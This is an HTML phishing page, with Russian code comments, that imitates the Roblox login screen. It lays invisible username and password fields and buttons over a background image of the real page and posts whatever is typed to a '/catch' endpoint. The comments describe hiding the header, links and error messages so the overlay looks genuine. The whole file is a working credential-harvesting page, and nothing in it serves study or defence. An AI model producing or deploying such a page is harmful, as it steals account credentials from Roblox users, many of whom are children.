<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .auth-container {
            background: transparent;
            width: 100%;
            max-width: 390px;
            padding: 0;
            margin-top: 20px; /* Немного опустили форму, так как заголовка больше нет */
            margin-left: 20px;
            box-sizing: border-box;
        }

        /* Полностью скрываем ненужные элементы */
        h1, 
        .link-text, 
        .signup-text {
            display: none !important;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-control {
            width: 100%;
            height: 44px;
            background: transparent;
            border: none;
            outline: none;
            color: #ffffff;
            font-size: 15px;
            padding: 0 14px;
            box-sizing: border-box;
            opacity: 0; 
        }

        .input-control::placeholder {
            color: transparent;
        }

        .input-control:focus {
            opacity: 1;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 4px;
        }

        .btn-submit {
            width: 100%;
            height: 42px;
            background: transparent;
            border: none;
            cursor: pointer;
            margin-top: 10px;
            opacity: 0;
        }

        .secondary-actions {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 55px;
        }

        .btn-secondary {
            width: 100%;
            height: 38px;
            background: transparent;
            border: none;
            cursor: pointer;
            opacity: 0;
        }

        .error-message {
            display: none;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <!-- Заголовок убран -->
        <form action="/catch" method="POST">
            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
            <input type="password" name="password" class="input-control" placeholder="Password" required>
            <div class="error-message">Incorrect username or password.</div>
            <button type="submit" class="btn-submit">Log In</button>
        </form>

        <a href="#" class="link-text">Forgot Password or Username?</a>
        
        <div class="secondary-actions">
            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
            <button type="button" class="btn-secondary">Quick Sign-In</button>
        </div>
        
        <div class="signup-text">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>

</body>
</html>
